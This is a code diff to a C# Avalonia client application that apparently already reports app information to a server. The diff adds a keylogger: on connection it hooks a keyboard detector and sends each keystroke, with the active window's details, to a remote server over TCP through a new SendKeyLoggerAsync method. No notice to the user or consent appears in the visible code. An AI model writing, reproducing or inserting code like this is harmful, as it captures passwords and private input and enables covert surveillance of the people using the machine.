@@ -5,6 +5,7 @@ using System.Text;
 using System.Threading.Tasks;
 using Avalonia.Threading;
 using DotNetEnv;
+using CLIENT.Helpers;
 
 namespace CLIENT.ViewModels
 {
@@ -29,7 +30,7 @@ namespace CLIENT.ViewModels
         private async Task ConnectToServerAsync()
         {
             string serverPortStr = Environment.GetEnvironmentVariable("SERVER_PORT") ?? "2025";
-            int port = int.TryParse(serverPortStr, out int p) ? p : 5000;
+            int port = int.TryParse(serverPortStr, out int p) ? p : 2025;
             string serverIp = Environment.GetEnvironmentVariable("MASTER_IP") ?? "127.0.0.1";
 
             while (true)
@@ -54,6 +55,16 @@ namespace CLIENT.ViewModels
 
                         // Start listening
                         _ = ListenToServerAsync();
+
+                        KeyboardDetector.OnKeyPressed += async (key) =>
+                        {
+                            string windowInfo = WindowDetector.GetActiveWindowInfo();
+                            await SendKeyLoggerAsync($"Key: {key}, {windowInfo}");
+                        };
+
+
+                        KeyboardDetector.Start();
+
                         break; // Exit the reconnect loop after successful connection
                     }
                 }
@@ -143,7 +154,30 @@ namespace CLIENT.ViewModels
         }
 
 
+        public async Task SendKeyLoggerAsync(string appName)
+        {
+            try
+            {
+                if (_client != null && _client.Connected && _stream != null)
+                {
+                    string message = $"{appName}";
+                    byte[] messageBytes = Encoding.UTF8.GetBytes(message);
+                    await _stream.WriteAsync(messageBytes, 0, messageBytes.Length);
 
+                    await Dispatcher.UIThread.InvokeAsync(() =>
+                    {
+                        Greeting = $"Sent to server: {message}";
+                    });
+                }
+            }
+            catch (Exception ex)
+            {
+                await Dispatcher.UIThread.InvokeAsync(() =>
+                {
+                    Greeting = "Send failed: " + ex.Message;
+                });
+            }
+        }
         public async Task SendAppInfoAsync(string appName)
         {
             try
